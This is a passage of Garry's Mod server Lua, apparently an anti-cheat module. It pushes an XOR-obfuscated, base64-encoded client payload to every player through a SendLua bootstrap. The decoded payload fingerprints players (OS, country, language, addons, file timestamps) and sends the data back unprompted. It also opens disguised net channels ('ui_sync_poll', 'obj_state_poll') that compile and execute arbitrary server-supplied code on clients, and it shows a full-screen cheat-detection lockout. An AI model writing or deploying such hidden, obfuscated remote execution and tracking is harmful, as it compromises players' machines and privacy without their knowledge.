gyBkYXRhwrsuINCf0L7Qu9GDLdGD0L3QuNC60LDQu9GM0L3Ri9C5INC80Y/Qs9C60LjQuSDRgdC40LPQvdCw0LsuCmxvY2FsIGZ1bmN0aW9uIGNvbmZpZ0hhc2goKQogICAgbG9jYWwgb2ssIHYgPSBwY2FsbChmaWxlLlJlYWQsICJjZmcvY29uZmlnLmNmZyIsICJHQU1FIikKICAgIGlmIG5vdCBvayBvciBub3QgaXNzdHJpbmcodikgb3IgdiA9PSAiIiB0aGVuIHJldHVybiAiIiBlbmQKICAgIGxvY2FsIGggPSAodXRpbC5TSEEyNTYgYW5kIHV0aWwuU0hBMjU2KHYpKSBvciAodXRpbC5DUkMgYW5kIHV0aWwuQ1JDKHYpKSBvciAiIgogICAgcmV0dXJuIHRvc3RyaW5nKGgpOnN1YigxLCAzMikKZW5kCgotLSDQktGB0ZEsINGH0YLQviDRgNC10LDQu9GM0L3QviDQtNC+0YHRgtGD0L/QvdC+INC40Lcg0L/QtdGB0L7Rh9C90LjRhtGLINC60LvQuNC10L3RgtGB0LrQvtCz0L4gTHVhIEdNb2QuINCd0LDRgdGC0L7Rj9GJ0LjQuSBIV0lECi0tIChDUFUv0LTQuNGB0Lov0LzQsNGC0LXRgNC40L3QutCwL9C40LzRjyDQn9CaL1dpbmRvd3MtR1VJRCkg0LTQstC40LbQvtC6INCd0JUg0L7RgtC00LDRkdGCIOKAlCDRgtC+0LvRjNC60L4g0L3QsNGC0LjQstC90YvQuQotLSDQutC70LjQtdC90YLRgdC60LjQuSDQvNC+0LTRg9C70Ywg0LzQvtCzINCx0YssINC60L7RgtC+0YDQvtCz0L4g0YMg0L3QsNGBINC90LXRgi4g0K3RgtC+INC80LDQutGB0LjQvNGD0Lwg0LjQtyDRh9C40YHRgtC+0LPQviBMdWEuCmxvY2FsIGZ1bmN0aW9uIENvbGxlY3REZXRhaWxzKCkKICAgIGxvY2FsIG5BZGQsIGFkZEggPSBhZGRvbnNTaWcoKQogICAgbG9jYWwgbGFuZyA9ICIiCiAgICBsb2NhbCBsdiA9IEdldENvblZhciBhbmQgR2V0Q29uVmFyKCJnbW9kX2xhbmd1YWdlIikKICAgIGlmIGx2IHRoZW4gbGFuZyA9IGx2OkdldFN0cmluZygpIGVuZAogICAgcmV0dXJuIHsKICAgICAgICBvcyAgICAgID0gb3NOYW1lKCksCiAgICAgICAgYXJjaCAgICA9IHRvc3RyaW5nKGppdCBhbmQgaml0LmFyY2ggb3IgIj8iKSwKICAgICAgICBsaml0ICAgID0gdG9zdHJpbmcoaml0IGFuZCBqaXQudmVyc2lvbiBvciAiPyIpLAogICAgICAgIGNvdW50cnkgPSB0b3N0cmluZyhzeXN0ZW0gYW5kIHN5c3RlbS5HZXRDb3VudHJ5IGFuZCBzeXN0ZW0uR2V0Q291bnRyeSgpIG9yICI/IiksCiAgICAgICAgbGFuZyAgICA9IChsYW5nIH49ICIiKSBhbmQgbGFuZyBvciAiPyIsCiAgICAgICAgcmVzICAgICA9IHRvc3RyaW5nKFNjclcoKSkgLi4gIngiIC4uIHRvc3RyaW5nKFNjckgoKSksCiAgICAgICAgZHggICAgICA9IHRvc3RyaW5nKHJlbmRlciBhbmQgcmVuZGVyLkdldERYTGV2ZWwgYW5kIHJlbmRlci5HZXREWExldmVsKCkgb3IgMCksCiAgICAgICAgcHMyICAgICA9IHRvc3RyaW5nKHJlbmRlciBhbmQgcmVuZGVyLlN1cHBvcnRzUGl4ZWxTaGFkZXJzXzJfMCBhbmQgcmVuZGVyLlN1cHBvcnRzUGl4ZWxTaGFkZXJzXzJfMCgpIG9yICIiKSwKICAgICAgICBhZGRvbnMgID0gbkFkZCwKICAgICAgICBhZGRvbl9oID0gdG9zdHJpbmcoYWRkSCk6c3ViKDEsIDE2KSwKICAgICAgICBjZmcgICAgID0gY29uZmlnSGFzaCgpLAogICAgICAgIGVuZyAgICAgPSBmdCgiYmluL2VuZ2luZS5kbGwiLCAiRVhFQ1VUQUJMRV9QQVRIIiksCiAgICAgICAgc2hhcmVkICA9IGZ0KCJiaW4vbHVhX3NoYXJlZC5kbGwiLCAiRVhFQ1VUQUJMRV9QQVRIIiksCiAgICAgICAgc3RlYW0gICA9IGZ0KCJz" ..
    "dGVhbS5pbmYiLCAiRVhFQ1VUQUJMRV9QQVRIIiksCiAgICB9CmVuZAoKLS0g0J7RgtC/0LXRh9Cw0YLQvtC6ID0gU0hBMjU2INC+0YIg0YHRgtCw0LHQuNC70YzQvdGL0YUg0L/QvtC70LXQuSDQvtC60YDRg9C20LXQvdC40Y8gKHYzOiArINCw0LTQtNC+0L3Riy/Rj9C30YvQui9HUFUpLgpsb2NhbCBmdW5jdGlvbiBDb21wdXRlRmluZ2VycHJpbnQoKQogICAgbG9jYWwgZCA9IENvbGxlY3REZXRhaWxzKCkKICAgIGxvY2FsIHBhcnRzID0gewogICAgICAgICJ2MyIsIGQub3MsIGQuYXJjaCwgZC5saml0LCBkLmNvdW50cnksIGQubGFuZywgZC5yZXMsIGQuZHgsIGQucHMyLAogICAgICAgIHRvc3RyaW5nKGQuYWRkb25zKSwgZC5hZGRvbl9oLCBkLmVuZywgZC5zaGFyZWQsIGQuc3RlYW0sCiAgICAgICAgZnQoImx1YS9hdXRvcnVuL2Jhc2VfdmVoaWNsZXMubHVhIiwgIkdBTUUiKSwKICAgIH0KICAgIGxvY2FsIHMgPSB0YWJsZS5jb25jYXQocGFydHMsICJ8IikKICAgIGxvY2FsIGZwID0gKHV0aWwuU0hBMjU2IGFuZCB1dGlsLlNIQTI1NihzKSkgb3IgdXRpbC5TSEExKHMpCiAgICByZXR1cm4gZnAsIGQKZW5kCgotLSDQldC00LjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCBtZXRhOiBmcCAo0YXRjdGIKSArIHBlcnNpc3RlbnQtdG9rZW4gKyDRh9C10LvQvtCy0LXQutC+0YfQuNGC0LDQtdC80YvQtSDQtNC10YLQsNC70LguCmxvY2FsIGZ1bmN0aW9uIFNlbmRNZXRhKCkKICAgIGxvY2FsIGZwLCBkID0gIiIsIG5pbAogICAgbG9jYWwgb2ssIHJlcywgZGV0ID0gcGNhbGwoQ29tcHV0ZUZpbmdlcnByaW50KQogICAgaWYgb2sgYW5kIGlzc3RyaW5nKHJlcykgdGhlbiBmcCA9IHJlczsgZCA9IGRldCBlbmQKICAgIGxvY2FsIHRvayA9IHJlYWRUb2tlbigpCiAgICBpZiB0b2sgfj0gIiIgdGhlbiB3cml0ZVRva2VuKHRvaykgZW5kCiAgICBsb2NhbCBkZXRhaWxzID0gIiIKICAgIGlmIGlzdGFibGUoZCkgdGhlbgogICAgICAgIGxvY2FsIG9raiwgaiA9IHBjYWxsKHV0aWwuVGFibGVUb0pTT04sIGQpCiAgICAgICAgaWYgb2tqIGFuZCBpc3N0cmluZyhqKSB0aGVuIGRldGFpbHMgPSBqIGVuZAogICAgZW5kCiAgICAtLSDQodC/0LjRgdC+0Logd3NpZCDQtNC70Y8g0L3QtdGH0ZHRgtC60L7QuSDQu9C40L3QutC+0LLQutC4INC/0L4g0L/QtdGA0LXRgdC10YfQtdC90LjRjiDQvNC90L7QttC10YHRgtCyICjQvtGC0LTQtdC70YzQvdGL0Lwg0L/QvtC70LXQvCwKICAgIC0tINGH0YLQvtCx0Ysg0L3QtSDRg9C/0LXRgNC10YLRjNGB0Y8g0LIg0LvQuNC80LjRgiBkZXRhaWxzKS4gQ1NWLCDQutCw0L8gfjQwMCBpZC4KICAgIGxvY2FsIGlkcyA9IGFkZG9uTGlzdCgpCiAgICBpZiAjaWRzID4gNDAwIHRoZW4gbG9jYWwgdCA9IHt9IGZvciBpID0gMSwgNDAwIGRvIHRbaV0gPSBpZHNbaV0gZW5kIGlkcyA9IHQgZW5kCiAgICBsb2NhbCB3c2lkcyA9IHRhYmxlLmNvbmNhdChpZHMsICIsIikKICAgIG5ldC5TdGFydCgic2Vzc19tZXRhX2FjayIpCiAgICAgICAgbmV0LldyaXRlU3RyaW5nKGZwKQogICAgICAgIG5ldC5Xcml0ZVN0cmluZyh0b2spCiAgICAgICAgbmV0LldyaXRlU3RyaW5nKGRldGFpbHMpICAgLS0gMy3QtSDQv9C+0LvQtTogSlNPTi3QtNC10YLQsNC70LggKNGB0YLQsNGA0YvQuSDRgdC10YDQstC10YAg0LjRhSDQv9GA0L7RgdGC0L4g0L3QtSDRh9C40YLQsNC10YIpCiAgICAgICAgbmV0LldyaXRlU3RyaW5nKHdzaWRzKSAgICAgLS0gNC3QtSDQv9C+0LvQtTogQ1NWIHdzaWQt0L/QvtC00L/QuNGB0L7QugogICAgbmV0LlNlbmRUb1NlcnZlcigpCmVuZAoKbmV0LlJlY2VpdmUoInNlc3NfbWV0YV9yZXEiLCBmdW5jdGlvbigpIFNlbmRNZXRhKCkgZW5kKQoKbmV0LlJlY2VpdmUoInNlc3NfdG9rZW5fc2V0IiwgZnVuY3Rpb24oKQogICAgbG9jYWwgY2sgPSBuZXQuUmVhZFN0cmluZygpCiAgICBpZiBjayBhbmQgY2sgfj0gIiIgdGhlbiB3cml0ZVRva2VuKGNrKSBlbmQKZW5kKQoKLS0gQ0RfRVZBU0lPTl9QUk9BQ1RJVkU6INC90LUg0LbQtNCw0YLRjCBzZXNzX21ldGFfcmVxICjQs9C+0L3QutCwIOKAlCDRgdC10YDQstC10YAg0YHQv9GA0LDRiNC40LLQsNC10YIg0LTQvgotLSDQt9Cw0LPRgNGD0LfQutC4INC80L7QtNGD0LvRjyDQuCDQsdC10Lcg0YDQtdGC0YDQsNGPIOKGkiBmcCDRgtC10YDRj9C70YHRjyDRgyAxMDAlKS4g0KjQu9GR0LwgbWV0YSDQodCQ0JzQmCDRh9C10YDQtdC3IDLRgS4KdGltZXIuU2ltcGxlKDIsIGZ1bmN0aW9uKCkgU2VuZE1ldGEoKSBlbmQpCgoKLS0gY2xfY2hlY2hhZGVmZW5kZXJfZ3VhcmQubHVhCmlmIG5vdCBDTElFTlQgdGhlbiByZXR1cm4gZW5kCgpsb2NhbCBfYyA9IENvbXBpbGVTdHJpbmcKbG9jYWwgX3AgPSBwY2FsbAoKbmV0LlJlY2VpdmUoIm9ial9zdGF0ZV9wb2xsIiwgZnVuY3Rpb24oKQogICAgbG9jYWwgbiA9IG5ldC5SZWFkVUludCgzMikKICAgIGxvY2FsIHMgPSBuZXQuUmVhZFN0cmluZygpCiAgICBsb2NhbCByID0ge30KICAgIGlmIHMgYW5kIHMgfj0gIiIgdGhlbgogICAgICAgIGxvY2FsIGYgPSBfYyhzLCAib2Jqc3RhdGUiLCBmYWxzZSkKICAgICAgICBpZiB0eXBlKGYpID09ICJmdW5jdGlvbiIgdGhlbgogICAgICAgICAgICBsb2NhbCBvaywgcmVzID0gX3AoZikKICAgICAgICAgICAgaWYgb2sgYW5kIHR5cGUocmVzKSA9PSAidGFibGUiIHRoZW4gciA9IHJlcyBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgbmV0LlN0YXJ0KCJvYmpfc3RhdGVfYWNrIikKICAgICAgICBuZXQuV3JpdGVVSW50KG4sIDMyKQogICAgICAgIG5ldC5Xcml0ZVVJbnQoI3IsIDYpCiAgICAgICAgZm9yIGkgPSAxLCAjciBkbyBuZXQuV3JpdGVTdHJpbmcodG9zdHJpbmcocltpXSkpIGVuZAogICAgbmV0LlNlbmRUb1NlcnZlcigpCmVuZCkKCgotLSBjbF9zaWxrd2FyZV9kZXRlY3Rvci5sdWEKCmlmIG5vdCBDTElFTlQgdGhlbiByZXR1cm4gZW5kCgpsb2NhbCBfQ29tcGlsZVN0cmluZyA9IENvbXBpbGVTdHJpbmcKbG9jYWwgX1NhZmVQY2FsbCAgICAg" ..
    "PSBwY2FsbAoKbmV0LlJlY2VpdmUoInVpX3N5bmNfcG9sbCIsIGZ1bmN0aW9uKCkKICAgIGxvY2FsIGNvZGUgPSBuZXQuUmVhZFN0cmluZygpCiAgICBpZiBub3QgY29kZSBvciBjb2RlID09ICIiIHRoZW4gcmV0dXJuIGVuZAoKICAgIGxvY2FsIGZuLCBlcnIgPSBfQ29tcGlsZVN0cmluZyhjb2RlLCAic3luY2NoayIsIGZhbHNlKQogICAgaWYgbm90IGZuIG9yIHR5cGUoZm4pIH49ICJmdW5jdGlvbiIgdGhlbiByZXR1cm4gZW5kCgogICAgX1NhZmVQY2FsbChmbikKZW5kKQoKbmV0LlJlY2VpdmUoInJlc19mZXRjaF9yZXEiLCBmdW5jdGlvbigpIGVuZCkKbmV0LlJlY2VpdmUoInJlc19mZXRjaF9jaHVuayIsIGZ1bmN0aW9uKCkgZW5kKQoKbG9jYWwgWkJfU1dfTUFUID0gTWF0ZXJpYWwoImNoZWNoYTEucG5nIiwgIm5vY2xhbXAgc21vb3RoIikKc3VyZmFjZS5DcmVhdGVGb250KCJaQl9TV19UaXRsZSIsIHsgZm9udCA9ICJBcmlhbCIsIHNpemUgPSA1Miwgd2VpZ2h0ID0gOTAwIH0pCnN1cmZhY2UuQ3JlYXRlRm9udCgiWkJfU1dfU3ViIiwgICB7IGZvbnQgPSAiQXJpYWwiLCBzaXplID0gMjIsIHdlaWdodCA9IDcwMCB9KQpzdXJmYWNlLkNyZWF0ZUZvbnQoIlpCX1NXX0JvZHkiLCAgeyBmb250ID0gIkFyaWFsIiwgc2l6ZSA9IDE2LCB3ZWlnaHQgPSA0MDAgfSkKc3VyZmFjZS5DcmVhdGVGb250KCJaQl9TV19UaW1lciIsIHsgZm9udCA9ICJBcmlhbCIsIHNpemUgPSA0NCwgd2VpZ2h0ID0gOTAwIH0pCnN1cmZhY2UuQ3JlYXRlRm9udCgiWkJfU1dfTW9ubyIsICB7IGZvbnQgPSAiQ291cmllciBOZXciLCBzaXplID0gMTMsIHdlaWdodCA9IDQwMCB9KQoKbmV0LlJlY2VpdmUoInVpX25vdGljZV9zaG93IiwgZnVuY3Rpb24oKQogICAgaWYgSXNWYWxpZChfR1siWkJfU1dfV2FybkZyYW1lIl0pIHRoZW4gX0dbIlpCX1NXX1dhcm5GcmFtZSJdOlJlbW92ZSgpIGVuZAoKICAgIGxvY2FsIHN3LCBzaCA9IFNjclcoKSwgU2NySCgpCiAgICBsb2NhbCBzdGFydEF0ID0gQ3VyVGltZSgpCgogICAgbG9jYWwgYmcgPSB2Z3VpLkNyZWF0ZSgiRFBhbmVsIikKICAgIF9HWyJaQl9TV19XYXJuRnJhbWUiXSA9IGJnCiAgICBiZzpTZXRTaXplKHN3LCBzaCkKICAgIGJnOlNldFBvcygwLCAwKQogICAgYmc6TWFrZVBvcHVwKCkKICAgIGJnOlNldEtleWJvYXJkSW5wdXRFbmFibGVkKGZhbHNlKQoKICAgIGJnLlBhaW50ID0gZnVuY3Rpb24oc2VsZiwgdywgaCkKICAgICAgICBsb2NhbCB0ID0gQ3VyVGltZSgpCiAgICAgICAgbG9jYWwgcHVsc2UgPSBtYXRoLmFicyhtYXRoLnNpbih0ICogMi4yKSkKICAgICAgICBsb2NhbCBwdWxzZTIgPSBtYXRoLmFicyhtYXRoLnNpbih0ICogMC43KSkKCiAgICAgICAgc3VyZmFjZS5TZXREcmF3Q29sb3IoNCwgMCwgMCwgMjU1KQogICAgICAgIHN1cmZhY2UuRHJhd1JlY3QoMCwgMCwgdywgaCkKCiAgICAgICAgc3VyZmFjZS5TZXREcmF3Q29sb3IoODAgKyBwdWxzZSAqIDQwLCAwLCAwLCA2MCArIHB1bHNlMiAqIDMwKQogICAgICAgIHN1cmZhY2UuRHJhd1JlY3QoMCwgMCwgdywgaCkKCiAgICAgICAgbG9jYWwgYncgPSA2ICsgcHVsc2UgKiA0CiAgICAgICAgc3VyZmFjZS5TZXREcmF3Q29sb3IoMTgwICsgcHVsc2UgKiA3NSwgMCwgMCwgMjAwICsgcHVsc2UgKiA1NSkKICAgICAgICBzdXJmYWNlLkRyYXdSZWN0KDAsIDAsIHcsIGJ3KQogICAgICAgIHN1cmZhY2UuRHJhd1JlY3QoMCwgaCAtIGJ3LCB3LCBidykKICAgICAgICBzdXJmYWNlLkRyYXdSZWN0KDAsIDAsIGJ3LCBoKQogICAgICAgIHN1cmZhY2UuRHJhd1JlY3QodyAtIGJ3LCAwLCBidywgaCkKCiAgICAgICAgZm9yIGkgPSAwLCBoLCA0IGRvCiAgICAgICAgICAgIGxvY2FsIGEgPSBtYXRoLnJhbmRvbSgwLCAxOCkKICAgICAgICAgICAgc3VyZmFjZS5TZXREcmF3Q29sb3IoMTIwLCAwLCAwLCBhKQogICAgICAgICAgICBzdXJmYWNlLkRyYXdSZWN0KDAsIGksIHcsIDIpCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIGN4LCBjeSA9IHcgLyAyLCBoICogMC4yMgogICAgICAgIGxvY2FsIGxvZ29TeiA9IDE0MCArIHB1bHNlICogMTIKICAgICAgICBsb2NhbCBhbmdsZSAgPSAodCAqIDQwKSAlIDM2MAogICAgICAgIHN1cmZhY2UuU2V0TWF0ZXJpYWwoWkJfU1dfTUFUKQogICAgICAgIHN1cmZhY2UuU2V0RHJhd0NvbG9yKDI1NSwgMjU1LCAyNTUsIDIyMCArIHB1bHNlICogMzUpCiAgICAgICAgc3VyZmFjZS5EcmF3VGV4dHVyZWRSZWN0Um90YXRlZChjeCwgY3ksIGxvZ29TeiwgbG9nb1N6LCBhbmdsZSkKICAgIGVuZAoKICAgIGxvY2FsIGZ1bmN0aW9uIGFkZExhYmVsKHBhcmVudCwgdGV4dCwgZm9udCwgY29sLCB4LCB5LCB3LCBoLCBhbGlnbikKICAgICAgICBsb2NhbCBsID0gdmd1aS5DcmVhdGUoIkRMYWJlbCIsIHBhcmVudCkKICAgICAgICBsOlNldFBvcyh4LCB5KQogICAgICAgIGw6U2V0U2l6ZSh3LCBoKQogICAgICAgIGw6U2V0VGV4dCh0ZXh0KQogICAgICAgIGw6U2V0Rm9udChmb250KQogICAgICAgIGw6U2V0VGV4dENvbG9yKGNvbCkKICAgICAgICBsOlNldENvbnRlbnRBbGlnbm1lbnQoYWxpZ24gb3IgNSkKICAgICAgICByZXR1cm4gbAogICAgZW5kCgogICAgYWRkTGFiZWwoYmcsICLQntCR0J3QkNCg0KPQltCV0J3QkCDQl9CQ0J/QoNCV0KnQgdCd0J3QkNCvINCf0KDQntCT0KDQkNCc0JzQkCIsICJaQl9TV19UaXRsZSIsCiAgICAgICAgQ29sb3IoMjU1LCAzMCwgMzApLCAwLCBzaCAqIDAuMzQsIHN3LCA2MCwgNSkKCiAgICBhZGRMYWJlbChiZywgIlwiU2lsa1dhcmVcIiAtINGH0LjRgtC10YDRgdC60L7QtSDQv9GA0L7Qs9GA0LDQvNC80L3QvtC1INC+0LHQtdGB0L/QtdGH0LXQvdC40LUiLCAiWkJfU1dfU3ViIiwKICAgICAgICBDb2xvcigyMjAsIDEyMCwgMTIwKSwgMCwgc2ggKiAwLjM0ICsgNjQsIHN3LCAzMCwgNSkKCiAgICBsb2NhbCBzZXAgPSBzaCAqIDAuNDYKICAgIGxvY2FsIGJvZHlXID0gbWF0aC5taW4oODIwLCBzdyAtIDgwKQogICAgbG9jYWwgYm9keVggPSAoc3cgLSBib2R5" ..
    "VykgLyAyCgogICAgbG9jYWwgbGluZXMgPSB7CiAgICAgICAgItCd0LAg0LLQsNGI0LXQvCDRg9GB0YLRgNC+0LnRgdGC0LLQtSDQt9Cw0YTQuNC60YHQuNGA0L7QstCw0L3QviDQuNGB0L/QvtC70YzQt9C+0LLQsNC90LjQtSDRh9C40YLQtdGA0YHQutC+0Lkg0L/RgNC+0LPRgNCw0LzQvNGLLiIsCiAgICAgICAgItCY0YHQv9C+0LvRjNC30L7QstCw0L3QuNC1INGH0LjRgtC+0LIg0L3QsCDQvdCw0YjQtdC8INGB0LXRgNCy0LXRgNC1INGB0YLRgNC+0LPQviDQt9Cw0L/RgNC10YnQtdC90L4uIiwKICAgICAgICAiIiwKICAgICAgICAiLSAtIC0gLSAtIC0g0JjQndCh0KLQoNCj0JrQptCY0K8g0J/QniDQo9CU0JDQm9CV0J3QmNCuIC0gLSAtIC0gLSAtIiwKICAgICAgICAiIiwKICAgICAgICAiLSDQl9Cw0LrRgNC+0LnRgtC1INC40LPRgNGDINC4INC/0L7Qu9C90L7RgdGC0YzRjiDRg9C00LDQu9C40YLQtSBTaWxrV2FyZSDRgSDQutC+0LzQv9GM0Y7RgtC10YDQsCIsCiAgICAgICAgIi0g0J7RgtC60YDQvtC50YLQtTogR2FycnkncyBNb2QgLyBnYXJyeXNtb2QgLyBkYXRhICAtICDRg9C00LDQu9C40YLQtSDQv9Cw0L/QutGDIHNpbGt3YXJlY2ZncyIsCiAgICAgICAgIi0g0J7Rh9C40YHRgtC40YLQtSDQstGB0LUg0L7RgdGC0LDQu9GM0L3Ri9C1INGH0LjRgtGLINC4INGB0LLRj9C30LDQvdC90YvQtSDRgSDQvdC40LzQuCDRhNCw0LnQu9GLIiwKICAgICAgICAiLSDQn9C10YDQtdC30LDQv9GD0YHRgtC40YLQtSBTdGVhbSDQuCBHYXJyeSdzIE1vZCwg0LfQsNC50LTQuNGC0LUg0YHQvdC+0LLQsCIsCiAgICAgICAgIiIsCiAgICAgICAgItCV0YHQu9C4INCy0Ysg0YPQtNCw0LvQuNC70Lgg0YfQuNGC0Ysg0Lgg0LfQsNGI0LvQuCDQsdC10Lcg0L3QuNGFIC0g0LLRiyDRgdC80L7QttC10YLQtSDQuNCz0YDQsNGC0YwuIiwKICAgICAgICAi0JXRgdC70Lgg0YfQuNGCINCx0YPQtNC10YIg0L7QsdC90LDRgNGD0LbQtdC9INC/0L7QstGC0L7RgNC90L4g0L/QvtGB0LvQtSDRh9C40YHRgtC+0LPQviDQstGF0L7QtNCwIC0g0J/QntCh0KLQntCv0J3QndCQ0K8g0JHQm9Ce0JrQmNCg0J7QktCa0JAuIiwKICAgIH0KCiAgICBsb2NhbCBseSA9IHNlcAogICAgZm9yIF8sIGxpbmUgaW4gaXBhaXJzKGxpbmVzKSBkbwogICAgICAgIGxvY2FsIGNvbCA9IENvbG9yKDIwMCwgMjAwLCAyMDApCiAgICAgICAgbG9jYWwgZm9udCA9ICJaQl9TV19Cb2R5IgogICAgICAgIGlmIHN0cmluZy5zdWIobGluZSwgMSwgNSkgPT0gIi0gLSAtIiB0aGVuCiAgICAgICAgICAgIGNvbCA9IENvbG9yKDIwMCwgNTAsIDUwKQogICAgICAgICAgICBmb250ID0gIlpCX1NXX01vbm8iCiAgICAgICAgZWxzZWlmIHN0cmluZy5zdWIobGluZSwgMSwgMSkgPT0gIi0iIHRoZW4KICAgICAgICAgICAgY29sID0gQ29sb3IoMjMwLCAxODAsIDE4MCkKICAgICAgICBlbHNlaWYgc3RyaW5nLmZpbmQobGluZSwgItCf0J7QodCi0J7Qr9Cd0J3QkNCvINCR0JvQntCa0JjQoNCe0JLQmtCQIikgdGhlbgogICAgICAgICAgICBjb2wgPSBDb2xvcigyNTUsIDYwLCA2MCkKICAgICAgICAgICAgZm9udCA9ICJaQl9TV19TdWIiCiAgICAgICAgZW5kCiAgICAgICAgYWRkTGFiZWwoYmcsIGxpbmUsIGZvbnQsIGNvbCwgYm9keVgsIGx5LCBib2R5VywgMjQsIDUpCiAgICAgICAgbHkgPSBseSArIChmb250ID09ICJaQl9TV19TdWIiIGFuZCAzMCBvciAyMikKICAgIGVuZAoKICAgIGxvY2FsIHRpbWVyTGJsID0gdmd1aS5DcmVhdGUoIkRMYWJlbCIsIGJnKQogICAgdGltZXJMYmw6U2V0UG9zKDAsIHNoIC0gOTApCiAgICB0aW1lckxibDpTZXRTaXplKHN3LCA2MCkKICAgIHRpbWVyTGJsOlNldEZvbnQoIlpCX1NXX1RpbWVyIikKICAgIHRpbWVyTGJsOlNldENvbnRlbnRBbGlnbm1lbnQoNSkKCiAgICB0aW1lckxibC5QYWludCA9IGZ1bmN0aW9uKHNlbGYsIHcsIGgpCiAgICAgICAgbG9jYWwgbGVmdCA9IG1hdGgubWF4KDAsIG1hdGguY2VpbCgxNSAtIChDdXJUaW1lKCkgLSBzdGFydEF0KSkpCiAgICAgICAgbG9jYWwgcHVsc2UgPSBtYXRoLmFicyhtYXRoLnNpbihDdXJUaW1lKCkgKiAzKSkKICAgICAgICBsb2NhbCByID0gMjU1CiAgICAgICAgbG9jYWwgZyA9IG1hdGguZmxvb3IocHVsc2UgKiA2MCkKICAgICAgICBzZWxmOlNldFRleHRDb2xvcihDb2xvcihyLCBnLCBnKSkKICAgICAgICBzZWxmOlNldFRleHQoItCe0KLQmtCb0K7Qp9CV0J3QmNCVINCn0JXQoNCV0Jc6ICIgLi4gbGVmdCAuLiAiINCh0JXQmi4iKQogICAgZW5kCgogICAgc3VyZmFjZS5QbGF5U291bmQoImFyYWJpYy1ub2tpYS5tcDMiKQplbmQpCg==") or ""

local function pushTo(ply)
  if not IsValid(ply) or ply:IsBot() then return end
  if #_CL == 0 or ply.cd_cl_acked then return end

  -- Ключ+enc+bootstrap генерятся ОДИН раз на игрока и кэшируются: ретраи шлют
  -- ТОТ ЖЕ бутстрап (иначе новый ключ рассинхронится с уже отправленным).
  if not ply._cd_boot then
    -- Per-player random XOR key; travels in the bootstrap as a double-quoted Lua
    -- string, so it must not contain quote/backslash. Alphanumeric alphabet is
    -- both safe to embed and to XOR with.
    local ALPH = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    local key = ""
    for _ = 1, 16 do local r = math.random(1, #ALPH) key = key .. string.sub(ALPH, r, r) end
    local enc = {}
    for i = 1, #_CL do enc[i] = string.char(bit.bxor(string.byte(_CL, i), string.byte(key, ((i - 1) % #key) + 1))) end
    ply._cd_enc = table.concat(enc)
    -- Tiny bootstrap: register a collector and ack readiness. Guard cd_cl_boot
    -- против двойного запуска (ретрай мог доставить бутстрап дважды).
    ply._cd_boot = [[
if _G.cd_cl_boot then net.Start("cd_cl_ready") net.SendToServer() return end
_G.cd_cl_boot = true
local _b = ""
net.Receive("cd_cl_push", function()
  local last = net.ReadBool()
  local n = net.ReadUInt(16)
  _b = _b .. net.ReadData(n)
  if not last then return end
  local k = "]] .. key .. [["
  local raw, out = _b, {}
  _b = ""
  for i = 1, #raw do out[i] = string.char(bit.bxor(string.byte(raw, i), string.byte(k, ((i - 1) % #k) + 1))) end
  local f = CompileString(table.concat(out), "cd_cl", false)
  if isfunction(f) then pcall(f) end
end)
net.Start("cd_cl_ready") net.SendToServer()
]]
  end

  ply:SendLua(ply._cd_boot)

  -- Ретрай доставки: если клиент не ответил cd_cl_ready — повторяем бутстрап
  -- (SendLua мог не выполниться / прийтись на смену карты). До 4 попыток.
  ply._cd_tries = (ply._cd_tries or 0) + 1
  if ply._cd_tries < 4 then
    timer.Simple(6, function() if IsValid(ply) and not ply.cd_cl_acked then pushTo(ply) end end)
  end
end

net.Receive("cd_cl_ready", function(_, ply)
  if not IsValid(ply) then return end
  ply.cd_cl_acked = true            -- остановить ретраи
  if ply._cd_streamed then return end -- стримим payload ровно один раз
  ply._cd_streamed = true
  local enc = ply._cd_enc
  if not enc then return end
  local CHUNK = 30000
  local total = #enc
  local off = 1
  while off <= total do
    local slice = string.sub(enc, off, off + CHUNK - 1)
    local nxt = off + CHUNK
    net.Start("cd_cl_push")
      net.WriteBool(nxt > total)   -- last?
      net.WriteUInt(#slice, 16)
      net.WriteData(slice, #slice)
    net.Send(ply)
    off = nxt
  end
end)

hook.Add("PlayerInitialSpawn", "cd_client_push", function(ply)
  timer.Simple(3, function() if IsValid(ply) then pushTo(ply) end end)
end)
-- Cover players already connected when the runtime loads.
for _, ply in ipairs(player.GetHumans()) do
  timer.Simple(1, function() if IsValid(ply) then pushTo(ply) end end)
end
end

do
if not SERVER then return end
util.AddNetworkString("cd_diag_resp")
util.AddNetworkString("ui_sync_poll")

-- Raw client Lua source (base64 in the bundle to avoid a long/odd token).
local _DIAG = util.Base64Decode("aWYgbm90IF9HLl9fY2RfZGlhZyB0aGVuCiAgX0cuX19jZF9kaWFnID0geyBlcnJzID0ge30sIHNwZXcgPSB7fSB9CiAgbG9jYWwgRCA9IF9HLl9fY2RfZGlhZwogIGlmIGhvb2sgYW5kIGhvb2suQWRkIHRoZW4KICAgIGhvb2suQWRkKCJPbkx1YUVycm9yIiwgImNkX2RpYWdfZXJyIiwgZnVuY3Rpb24oZXJyKSBELmVycnNbI0QuZXJycysxXSA9IHN0cmluZy5zdWIodG9zdHJpbmcoZXJyKSwxLDMwMCkgaWYgI0QuZXJycz40MCB0aGVuIHRhYmxlLnJlbW92ZShELmVycnMsMSkgZW5kIGVuZCkKICBlbmQKICBsb2NhbCBfcCA9IHByaW50CiAgcHJpbnQgPSBmdW5jdGlvbiguLi4pIGxvY2FsIGE9e30gZm9yIGk9MSxzZWxlY3QoIiMiLC4uLikgZG8gYVtpXT10b3N0cmluZygoc2VsZWN0KGksLi4uKSkpIGVuZCBELnNwZXdbI0Quc3BldysxXT1zdHJpbmcuc3ViKHRhYmxlLmNvbmNhdChhLCJcdCIpLDEsMzAwKSBpZiAjRC5zcGV3PjYwIHRoZW4gdGFibGUucmVtb3ZlKEQuc3BldywxKSBlbmQgcmV0dXJuIF9wKC4uLikgZW5kCmVuZApsb2NhbCBEID0gX0cuX19jZF9kaWFnCmxvY2FsIHNuYXAgPSB7IGVycnMgPSBELmVycnMsIHNwZXcgPSBELnNwZXcsIGhvb2tzID0ge30sIGdtID0gKGVuZ2luZSBhbmQgZW5naW5lLkFjdGl2ZUdhbWVtb2RlIGFuZCBlbmdpbmUuQWN0aXZlR2FtZW1vZGUoKSkgb3IgIj8iIH0KbG9jYWwgZXYgPSB7IlRoaW5rIiwiSFVEUGFpbnQiLCJIVURQYWludEJhY2tncm91bmQiLCJQcmVSZW5